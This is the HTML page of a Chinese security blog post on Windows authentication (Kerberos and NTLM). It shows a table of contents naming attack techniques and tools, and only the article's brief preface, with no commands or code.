<meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e450d84acb5b4886.png">
<meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0107c2b3399eb8c7e9.png">
<meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016c35bea3e45cabc3.png">
<meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018d19d568176b275a.png">
<meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0196371e3c0a838947.png">
<meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0148cdbaede51f0c63.png">
<meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a738a620adf08b5f.png">
<meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d47c4970589d80b9.png">
<meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0194265565e1e16f3a.png">
<meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b973a1501589a825.png">
<meta property="article:published_time" content="2022-07-27T08:16:31.130Z">
<meta property="article:modified_time" content="2022-07-27T14:30:06.046Z">
<meta property="article:author" content="nu1r">
<meta property="article:tag" content="后渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown96074895_p9.jpg">


<link rel="canonical" href="https://nuxm.gitee.io/windows/Windows%E8%AE%A4%E7%9F%A5%E6%9C%BA%E5%88%B6/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://nuxm.gitee.io/windows/Windows%E8%AE%A4%E7%9F%A5%E6%9C%BA%E5%88%B6/","path":"windows/Windows认知机制/","title":"windows认证机制"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>windows认证机制 | nu1rの沉思录</title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">nu1rの沉思录</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">某超科学Web安全研究员</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kerberos-%E7%AF%87"><span class="nav-number">2.</span> <span class="nav-text">Kerberos 篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#AS-REQ-amp-AS-REP"><span class="nav-number">2.1.</span> <span class="nav-text">AS_REQ &amp; AS_REP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80-1"><span class="nav-number">2.1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kerberos-%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0"><span class="nav-number">2.1.2.</span> <span class="nav-text">kerberos 协议概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kerberos-%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="nav-number">2.1.3.</span> <span class="nav-text">kerberos 测试工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AS-REQ"><span class="nav-number">2.1.4.</span> <span class="nav-text">AS_REQ</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pvno"><span class="nav-number">2.1.4.1.</span> <span class="nav-text">pvno</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msg-type"><span class="nav-number">2.1.4.2.</span> <span class="nav-text">msg-type</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PA-DATA"><span class="nav-number">2.1.4.3.</span> <span class="nav-text">PA_DATA</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#REQ-BODY"><span class="nav-number">2.1.4.4.</span> <span class="nav-text">REQ_BODY</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AS-REP"><span class="nav-number">2.1.5.</span> <span class="nav-text">AS_REP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#msg-type-1"><span class="nav-number">2.1.5.1.</span> <span class="nav-text">msg-type</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#crealm"><span class="nav-number">2.1.5.2.</span> <span class="nav-text">crealm</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cname"><span class="nav-number">2.1.5.3.</span> <span class="nav-text">cname</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ticket"><span class="nav-number">2.1.5.4.</span> <span class="nav-text">ticket</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#enc-part"><span class="nav-number">2.1.5.5.</span> <span class="nav-text">enc_part</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%87%BA%E7%9A%84%E7%A5%A8%E6%8D%AE"><span class="nav-number">2.1.6.</span> <span class="nav-text">导出的票据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="nav-number">2.1.7.</span> <span class="nav-text">相关的安全问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pass-the-hash-%E5%92%8C-pass-the-key"><span class="nav-number">2.1.7.1.</span> <span class="nav-text">pass the hash 和 pass the key</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#p1"><span class="nav-number">2.1.7.2.</span> <span class="nav-text">用户名枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Password-Spraying"><span class="nav-number">2.1.7.3.</span> <span class="nav-text">Password Spraying</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AS-REPRoasting"><span class="nav-number">2.1.7.4.</span> <span class="nav-text">AS-REPRoasting</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#p2"><span class="nav-number">2.1.7.5.</span> <span class="nav-text">黄金票据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E7%9B%B8%E5%85%B3%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="nav-number">2.1.8.</span> <span class="nav-text">部分相关的工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Rubeus"><span class="nav-number">2.1.8.1.</span> <span class="nav-text">Rubeus</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#impacket"><span class="nav-number">2.1.8.2.</span> <span class="nav-text">impacket</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz"><span class="nav-number">2.1.8.3.</span> <span class="nav-text">mimikatz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap-NSE%E8%84%9A%E6%9C%AC"><span class="nav-number">2.1.8.4.</span> <span class="nav-text">nmap NSE脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DomainPasswordSpray"><span class="nav-number">2.1.8.5.</span> <span class="nav-text">DomainPasswordSpray</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TGS-REQ-amp-TGS-REP"><span class="nav-number">2.2.</span> <span class="nav-text">TGS_REQ &amp; TGS_REP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80-2"><span class="nav-number">2.2.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TGS-REQ"><span class="nav-number">2.2.2.</span> <span class="nav-text">TGS_REQ</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#msg-type-2"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">msg-type</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PA-DATA-1"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">PA-DATA</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#REQ-BODY-1"><span class="nav-number">2.2.2.3.</span> <span class="nav-text">REQ_BODY</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TGS-REP"><span class="nav-number">2.2.3.</span> <span class="nav-text">TGS_REP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#msg-type-3"><span class="nav-number">2.2.3.1.</span> <span class="nav-text">msg-type</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ticket-1"><span class="nav-number">2.2.3.2.</span> <span class="nav-text">ticket</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#enc-part-1"><span class="nav-number">2.2.3.3.</span> <span class="nav-text">enc_part</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#S4U2SELF"><span class="nav-number">2.2.4.</span> <span class="nav-text">S4U2SELF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#S4U2PROXY"><span class="nav-number">2.2.5.</span> <span class="nav-text">S4U2PROXY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A7%94%E6%B4%BE"><span class="nav-number">2.2.6.</span> <span class="nav-text">委派</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">2.2.6.1.</span> <span class="nav-text">非约束委派</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">2.2.6.2.</span> <span class="nav-text">约束委派</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">2.2.6.3.</span> <span class="nav-text">基于资源的约束委派</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-1"><span class="nav-number">2.2.7.</span> <span class="nav-text">相关的安全问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pass-the-ticket"><span class="nav-number">2.2.7.1.</span> <span class="nav-text">pass the ticket</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kerberosting"><span class="nav-number">2.2.7.2.</span> <span class="nav-text">kerberosting</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#p3"><span class="nav-number">2.2.7.3.</span> <span class="nav-text">白银票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-number">2.2.7.4.</span> <span class="nav-text">非约束委派攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-number">2.2.7.5.</span> <span class="nav-text">约束委派攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-number">2.2.7.6.</span> <span class="nav-text">基于资源的约束委派攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7"><span class="nav-number">2.2.8.</span> <span class="nav-text">部分相关工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#rubeus"><span class="nav-number">2.2.8.1.</span> <span class="nav-text">rubeus</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz-1"><span class="nav-number">2.2.8.2.</span> <span class="nav-text">mimikatz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#impacket-1"><span class="nav-number">2.2.8.3.</span> <span class="nav-text">impacket</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kerberoast"><span class="nav-number">2.2.8.4.</span> <span class="nav-text">kerberoast</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Powermad"><span class="nav-number">2.2.8.5.</span> <span class="nav-text">Powermad</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PAC"><span class="nav-number">2.3.</span> <span class="nav-text">PAC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80-3"><span class="nav-number">2.3.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PAC-%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.3.2.</span> <span class="nav-text">PAC 介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PAC%E7%BB%93%E6%9E%84"><span class="nav-number">2.3.3.</span> <span class="nav-text">PAC结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="nav-number">2.3.4.</span> <span class="nav-text">相关安全问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E7%9B%B8%E5%85%B3%E7%9A%84%E5%B7%A5%E5%85%B7-1"><span class="nav-number">2.3.5.</span> <span class="nav-text">部分相关的工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#kekeo"><span class="nav-number">2.3.5.1.</span> <span class="nav-text">kekeo</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#impacket-2"><span class="nav-number">2.3.5.2.</span> <span class="nav-text">impacket</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msf"><span class="nav-number">2.3.5.3.</span> <span class="nav-text">msf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pykek"><span class="nav-number">2.3.5.4.</span> <span class="nav-text">pykek</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NTLM-%E7%AF%87"><span class="nav-number">3.</span> <span class="nav-text">NTLM 篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NTLM-%E5%9F%BA%E7%A1%80"><span class="nav-number">3.1.</span> <span class="nav-text">NTLM 基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80-4"><span class="nav-number">3.1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LM-Hash-amp-NTLM-Hash"><span class="nav-number">3.1.2.</span> <span class="nav-text">LM Hash &amp; NTLM Hash</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LM-Hash"><span class="nav-number">3.1.2.1.</span> <span class="nav-text">LM Hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NTLM-Hash"><span class="nav-number">3.1.2.2.</span> <span class="nav-text">NTLM Hash</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="nav-number">3.1.3.</span> <span class="nav-text">NTLM身份验证</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#type-1-%E5%8D%8F%E5%95%86"><span class="nav-number">3.1.3.1.</span> <span class="nav-text">type 1 协商</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#type-2-%E8%B4%A8%E8%AF%A2"><span class="nav-number">3.1.3.2.</span> <span class="nav-text">type 2 质询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#type-3-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="nav-number">3.1.3.3.</span> <span class="nav-text">type 3 身份验证</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Net-ntlm-hash"><span class="nav-number">3.1.4.</span> <span class="nav-text">Net-ntlm hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSP-amp-SSPI"><span class="nav-number">3.1.5.</span> <span class="nav-text">SSP &amp; SSPI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LmCompatibilityLevel"><span class="nav-number">3.1.6.</span> <span class="nav-text">LmCompatibilityLevel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-2"><span class="nav-number">3.1.7.</span> <span class="nav-text">相关的安全问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pass-the-hash"><span class="nav-number">3.1.7.1.</span> <span class="nav-text">pass the hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ntlm%E8%BF%9B%E8%A1%8C%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.1.7.2.</span> <span class="nav-text">利用ntlm进行的信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ntlm-relay"><span class="nav-number">3.1.7.3.</span> <span class="nav-text">ntlm relay</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%91%E8%B5%B7NTLM-%E8%AF%B7%E6%B1%82"><span class="nav-number">3.2.</span> <span class="nav-text">发起NTLM  请求</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80-5"><span class="nav-number">3.2.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%BE%E6%A0%87"><span class="nav-number">3.2.2.</span> <span class="nav-text">图标</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#desktop-ini"><span class="nav-number">3.2.2.1.</span> <span class="nav-text">desktop.ini</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#scf-%E6%96%87%E4%BB%B6"><span class="nav-number">3.2.2.2.</span> <span class="nav-text">scf 文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E5%A4%B4%E5%83%8F"><span class="nav-number">3.2.2.3.</span> <span class="nav-text">用户头像</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%90%BA%E5%B8%A6UNC%E8%B7%AF%E5%BE%84"><span class="nav-number">3.2.3.</span> <span class="nav-text">系统命令携带UNC路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">3.2.4.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#outlook"><span class="nav-number">3.2.5.</span> <span class="nav-text">outlook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PDF"><span class="nav-number">3.2.6.</span> <span class="nav-text">PDF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#office"><span class="nav-number">3.2.7.</span> <span class="nav-text">office</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL"><span class="nav-number">3.2.8.</span> <span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NBNS%E5%92%8CLLMNR"><span class="nav-number">3.2.9.</span> <span class="nav-text">NBNS和LLMNR</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LLMNR"><span class="nav-number">3.2.9.1.</span> <span class="nav-text">LLMNR</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NBNS"><span class="nav-number">3.2.9.2.</span> <span class="nav-text">NBNS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WPAD%E5%92%8Cmitm6"><span class="nav-number">3.2.10.</span> <span class="nav-text">WPAD和mitm6</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E5%90%88LLMNR-x2F-NBNS%E6%8A%95%E6%AF%92"><span class="nav-number">3.2.10.1.</span> <span class="nav-text">配合LLMNR&#x2F;NBNS投毒</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E5%90%88DHCPv6"><span class="nav-number">3.2.10.2.</span> <span class="nav-text">配合DHCPv6</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE-amp-amp-SSRF"><span class="nav-number">3.2.11.</span> <span class="nav-text">XXE &amp;&amp; SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XXE"><span class="nav-number">3.2.11.1.</span> <span class="nav-text">XXE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF"><span class="nav-number">3.2.11.2.</span> <span class="nav-text">SSRF</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%93%E5%8D%B0%E6%9C%BA%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.2.12.</span> <span class="nav-text">打印机漏洞</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="nu1r"
      src="/images/12.jpg">
  <p class="site-author-name" itemprop="name">nu1r</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">26</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">24</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/nuxl1r" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;nuxl1r" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:nuxm771@163.com" title="E-Mail → mailto:nuxm771@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/nuxl1r" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://nuxm.gitee.io/windows/Windows%E8%AE%A4%E7%9F%A5%E6%9C%BA%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/12.jpg">
      <meta itemprop="name" content="nu1r">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="nu1rの沉思录">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="windows认证机制 | nu1rの沉思录">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          windows认证机制
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-07-27 16:16:31 / 修改时间：22:30:06" itemprop="dateCreated datePublished" datetime="2022-07-27T16:16:31+08:00">2022-07-27</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F%E7%90%86%E8%AE%BA%E7%AF%87/" itemprop="url" rel="index"><span itemprop="name">后渗透理论篇</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>闲着也是闲着，所以整理一篇，让自己的知识形成体系，后面还会出2篇。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown96074895_p9.jpg"></p>
<span id="more"></span>

<p>特此声明，文中部分描述来自wiki。</p>
<h1 id="Kerberos-篇"><a href="#Kerberos-篇" class="headerlink" title="Kerberos 篇"></a>Kerberos 篇</h1><h2 id="AS-REQ-amp-AS-REP"><a href="#AS-REQ-amp-AS-REP" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>体量太大，所以每一个大章一个前言。</p>
